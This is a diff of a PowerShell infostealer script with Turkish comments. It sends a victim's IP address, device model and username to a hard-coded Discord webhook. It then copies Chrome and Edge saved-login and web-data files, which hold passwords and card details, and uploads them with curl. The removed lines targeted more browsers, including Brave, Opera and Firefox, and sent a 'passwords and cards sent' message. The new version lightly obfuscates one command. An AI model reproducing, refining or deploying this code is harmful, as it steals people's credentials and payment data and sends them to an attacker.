@@ -1,35 +1,23 @@
 $w = "https://discord.com/api/webhooks/1501992942435307532/boIQdDen1QjAWSFgQwKBBtIN7dgbleLaOn7yllPYGN_LyGNs5PouMJbdEsDZbSYN_G2A"
 
-# --- SAF VERİ TOPLAMA ---
-$ip = "Bilinmiyor"
-try { $ip = (Invoke-WebRequest -uri "ifconfig.me/ip" -UserAgent "curl").Content.Trim() } catch {}
+# --- SAF VERİ ---
+$ip = (i'r'm ifconfig.me).Trim()
 $cihaz = (Get-CimInstance Win32_ComputerSystem).Model
 $kullanici = $env:USERNAME
-
-# --- DİREKT METİN OLARAK GÖNDER ---
 $mesaj = "İp $ip`nCihaz ismi $cihaz`nKullanici ismi $kullanici"
 & "curl.exe" -d "content=$mesaj" $w
 
-# --- TÜM TARAYICI YOLLARI (ŞİFRE VE KART) ---
-$hedef_dosyalar = @(
+# --- DOSYALARI ÇEK ---
+$paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
-    "$env:AppData\Opera Software\Opera Stable\Login Data",
-    "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
 )
 
-# --- DOSYALARI ÇAL VE FIRLAT ---
-foreach ($dosya in $hedef_dosyalar) {
-    if (Test-Path $dosya) {
-        $gecici = "$env:TEMP\$(random).db"
-        Copy-Item $dosya -Destination $gecici -Force
-        & "curl.exe" -F "file=@$gecici" $w
-        Remove-Item $gecici
+foreach ($p in $paths) {
+    if (Test-Path $p) {
+        $t = "$env:TEMP\$(random).db"
+        Copy-Item $p -Destination $t -Force
+        & "curl.exe" -F "file=@$t" $w
     }
 }
-
-# --- SON BİLGİ ---
-& "curl.exe" -d "content=kart bilgileri ve sifreler gonderildi" $w
